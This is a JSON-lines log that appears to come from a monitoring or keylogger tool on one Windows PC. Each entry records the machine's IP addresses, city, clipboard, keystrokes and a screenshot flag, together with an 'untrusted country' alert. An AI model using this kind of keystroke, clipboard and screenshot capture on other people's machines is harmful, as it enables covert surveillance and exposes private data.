{"timestamp": "2025-05-13T13:17:43.138480", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "e52f886adc3b5bd923944872b774a0a4bf5ead6d3ea6c6550071eefab33927f9", "log_hash": "54e6af7a91e1e9af35fb1d172703ae8dc47ffe883d61a1883f00e3d382647753"}
{"timestamp": "2025-05-13T13:18:09.761518", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bb2a5c215f89df1a5a0461641286d674484ccc379ccdad096ae2c8db98c1aa92", "log_hash": "50b8fdecd9069aaf6d4b22bde5f57502312f7d717396a8352f81f54f162fd365"}
{"timestamp": "2025-05-13T13:18:36.311855", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "a575d0b4d210268b9e666a3462645062cbe9c9857b4ed0401d8e5ce19f0180fb", "log_hash": "d31ada417bbf0ed66b39cbabfebbe494c6b4411e2c4ac50a9e27273d2b10e4b5"}
{"timestamp": "2025-05-13T13:19:02.708438", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "2f889f5b00da70ce01241879e515be25c722f4486562c3d78e6810ff014a4fd0", "log_hash": "2add49f32863433b7c634e30bb24d2e9f44ac940d465a54cddc9d2ef33c5376a"}
{"timestamp": "2025-05-13T13:19:29.300537", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "d8f546fb4e16f1b833bed036a68bdec39315d473769267c691b821bdf54aeb1e", "log_hash": "bd64ba8811e0cf1af2e95014b793b8f70987c96187a21c43fab1a8f6d540b6df"}
{"timestamp": "2025-05-13T13:19:56.077774", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bc1ecf917ece02e7223c4d8c8e475d994dccff6f0ee68a9e7563e471c251ddd6", "log_hash": "c1c59b8fcd063d876674f3cd2eee3995d369b33cd90681f7312458d9abfcd3db"}
{"timestamp": "2025-05-13T13:20:22.538182", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "48ce0783ee3672c93c5c9d44c800ed1c5ee1105ae727ce095fa00f15d3eb934c", "log_hash": "dfb4d518597ad6234b0f682ccb2247cad25ae989b47c61a8e0523efbcfb2200b"}
{"timestamp": "2025-05-14T19:33:40.869671", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9a37779b41963c1e3b22f4e86fe4800fe6a0c4cd88ee4bdb85b05ca704e5edc7", "log_hash": "3bebd32295f8fcd810b2cec86149cf15653755f59b20b8e20a35348dd4c427db"}
{"timestamp": "2025-05-15T12:25:47.799246", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "3d58f3b7d3a443ae7046e143fdbc36b7512d335b8840d41080e40081c6a303e0", "log_hash": "21c227bf71a18f017d80a593bdce57888e93b567e420098c3f5ad00c20884c72"}
{"timestamp": "2025-05-16T20:05:33.067917", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "5368f4a6d93725777e69f22b15d9d88d073d0783779758308b6811aa174cd0db", "log_hash": "99b782de49f754259188fbdf1f869c8f5252f397970ce65448fb6e258be131d0"}
{"timestamp": "2025-05-17T20:43:01.574539", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "stop__snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "deacdc277eeeca90ed6c6561c3a4b4a331e279688595d3bdba474dd08898f361", "log_hash": "bd14b09b731de634fc60380c619679cfa23e80f444f3baced994739101e07703"}
{"timestamp": "2025-05-17T20:43:29.802618", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": " ent~aio :smile", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "d34b04ba0e417c32edaa2cdc3bb97af949bde8f76cc6f3ac905b1d0d4f629631", "log_hash": "e997d079b8eae64729d75f3883f86bc7b32bb3a7b5e1171cc727047ca366c85d"}
{"timestamp": "2025-05-17T20:43:56.132213", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "8ef229e66695ec6c34874b433d83004b3a52c19ece86e2777cd595bd220cfc8d", "log_hash": "a6b91ba1d82d69c2d5ae95f5201343174eeb00063a30d29948cde132699418d8"}
{"timestamp": "2025-05-18T09:13:33.331336", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "ac5811700c2c63ca8ce9c387672f13dcdd4a491448f758cbec3ebaa158f5923f", "log_hash": "082db9e4af15629f3e664cd5db2eb362c7766b0aa7dde0c5fe65456a0d7fabdb"}
{"timestamp": "2025-05-18T09:14:00.927045", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "5fff55a8c68565e0b8daba698a87c23bb0b3629bec9f032b84212e2adecc0bd2", "log_hash": "86a756bac45e04802a59ddda23f086a3085e7442e12f34d71e2933d18d783f7c"}
{"timestamp": "2025-05-18T09:14:27.356679", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "56234d7441079c8f51f9679cad587b94449619f0916927782616be9205ea5d53", "log_hash": "72f8be71aa200dc43dfeb3902fc2d0bc99eb070ee2a18f49270b95c094a49c6a"}
{"timestamp": "2025-05-18T09:14:53.732587", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "94489c4dbe178dc09c78e8c7e0c69062686df655b942e5834ad1e5b4a1459393", "log_hash": "63a926a741faf96ec81b16bf6e5716e07c2e93e31b4aa3e46202ea2074c9da62"}
{"timestamp": "2025-05-18T09:15:20.067449", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "d6c8a0c8011cfeaca8e239d699be73f7fde856f610066e1a9c70c4edaeeb8fe0", "log_hash": "8127ed67398fd1656819d256d85810ced1d61ce0c1837c6c92883088761ed38c"}
{"timestamp": "2025-05-18T09:15:46.631659", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "63694911100c3480cc97a2790c2a77642f146611ad3a6c733b1bc949b146a63f", "log_hash": "ead592e40d8da42ca775c82dee6ba3feea4fd42b28460215c90c9e5bf63f6665"}
{"timestamp": "2025-05-18T09:16:13.457691", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b14f67421f9bb267fb671166c37587f20834e3c98b68b524e36047e2e663f792", "log_hash": "f419a379bb06dac5b2f76d9ce4a3ca439aacbf52dddb52d482f47df439bd8b4c"}
{"timestamp": "2025-05-18T09:16:40.096336", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "1b9254de68f3fe5a784458f67544b6f87959875c913421a255e1b168861ec0b5", "log_hash": "6bad50f4418a2aba87a59e74a4c1f2a553fd9583d1886611ffc2fe1871645de2"}
{"timestamp": "2025-05-18T09:17:06.696244", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "798cf83a458aa5d5e4c63aab6796b20ba9934357a69679570dde20110461c41a", "log_hash": "37584245fff5659d0dbb64199d19994e906d39ad06cdcf08ed82f3c49141d164"}
{"timestamp": "2025-05-18T09:17:33.028196", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "d21024df05b20837cc8d3445187e5e62ac7efd248c8fc418b486adc23a5538c8", "log_hash": "4a3f4593d3d90fcf1f9fe23507312212f185a5ab4172cc9f3c8659b32d40ef89"}
{"timestamp": "2025-05-18T09:17:59.487787", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "7f46a3fa4612cb713a877457e9f2c5fa4d1465fc3c8555c5fd759eb03cefe9ea", "log_hash": "1829c26d55112626c7b7a32cb3bcbad846963fac995b72a5c44e8d65375f1048"}
{"timestamp": "2025-05-18T09:18:26.076835", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b5ddb9fd46ff0913fe20670126711d43321f2bd0b2a5902230fb47c9367fcd31", "log_hash": "2281945b6ca20be32500dbd16c3edd3be101fadaebc86fd1645b2c81ab16e1cf"}
{"timestamp": "2025-05-18T09:18:52.768571", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9e7f1dd73707a50030a72b2fbe810f28e67da38723f48eadf61ed7ad3a10b999", "log_hash": "1ddf36d5bf3a5c10ddf1eb0ec752da2db2e11042d26c67b224c07f5fe4aaf21c"}
{"timestamp": "2025-05-18T09:19:19.360784", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "5a54cd8fe882aa6c11bbf942dcdccd014482530cd1470d5fba3f929ae8365509", "log_hash": "1cd39ee4c02654b0c60c44c890eec64beff1c448d9ea3ed14e6a18d6a1618ca4"}
{"timestamp": "2025-05-18T09:19:45.904955", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b978811e330c4c791012ce625da4aae29555a713b457e4221cdc6f7dee3b14dd", "log_hash": "9bd11cb45e1cfb8ff61fbc7f2e4206b1c96873d07c09bda5f68cf5e0a87b94f6"}
{"timestamp": "2025-05-18T09:20:12.750229", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "db6730e9cfc86b82c368e2f75f44ff2fc1b77a7d38e69bed6deb12abc8c6911b", "log_hash": "14f0d34781ad0d045a73fa189cb1accd4f38ed0c13b0bc716071a722395f7edf"}
{"timestamp": "2025-05-18T09:20:39.401885", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b40881ee7105659b5823f944e0c05bebc4953a81eebc16532a39365c75d78c5e", "log_hash": "afb9d83c473a62f05bdd3fcc124738c3329d298f3471bea992ff27c79c16b63c"}
{"timestamp": "2025-05-19T11:16:25.314269", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bbd0b5344c3363ca039728ac08e351cdbff73ef4d3c4a0fc8c41d1cb8d79763d", "log_hash": "7bb582615705bf10f1180e0e70d861caaad435f56ba79be85060ed280193e652"}
{"timestamp": "2025-05-19T11:16:53.243703", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "013a8746de9f346a0103a226c354cfc7be7d731a9940eb2596e5ba262d7107c6", "log_hash": "0562a7116b2de09fd9d2437532381bc7c81d66b4b44ef42c5dc5be4bc8c29a06"}
{"timestamp": "2025-05-19T11:17:19.747021", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "4f351c78807875c7725498b5d01805a016f117998cc13baaa139c28c51d17fee", "log_hash": "333b5ac3022631bb3d09185d35e70806c4b1dea36a4d753e396f59b09e5543c8"}
{"timestamp": "2025-05-19T11:17:46.562532", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "c99fa7de0482cc658ac0c651b4437630ae73c6e2080ada78c0f572596039b18d", "log_hash": "2af42fb34d1b99e0228ff81b7b005dec9d6aa7360433a081c4abdb5226f20c42"}
{"timestamp": "2025-05-19T11:18:13.116113", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "3d680cb87837c702d827bc4b594b79bc48c9c882e23f1dd189ca75b7653ce55e", "log_hash": "deef82cad717a960d80694f90fb09ef60fc9877a2beef81f3281d9aa2ad64f86"}
{"timestamp": "2025-05-19T11:18:39.463678", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "4ed20b51d01bef1ca9c6da343d37402da4d3d7614c98d7eb929e7995472bc3c5", "log_hash": "0397e3d1a6dddbb71bad6aba2c5d444a46076ee5d3fbe61d4681c9460f24fe09"}
{"timestamp": "2025-05-19T11:19:05.928883", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "3088209024970d2e8433b06cc2dbef05b6432dd69735597bb8a633ef6622f981", "log_hash": "ab43a771a1ea0688527592747e9ea046df2a0d3b1214ac431a00dc16cbbe6cf2"}
{"timestamp": "2025-05-19T11:19:32.847115", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "197c95b7ef227caff385950e2c3ac8eff3c32109d2f5188dbcb5ce01e6221dcd", "log_hash": "055f659342eb1b52021eab89d9254ea420a87c73e01c44fc1800311baa3bf2bc"}
{"timestamp": "2025-05-19T11:19:59.515298", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "16b34070916192306e4c68335a17c39ac362200b372c3a3889a47d3d6325e3d7", "log_hash": "6afc509b3ec3d8f1dd7aa81c9619d5667b68e46e477d90a2e0f42e13a1f27a8a"}
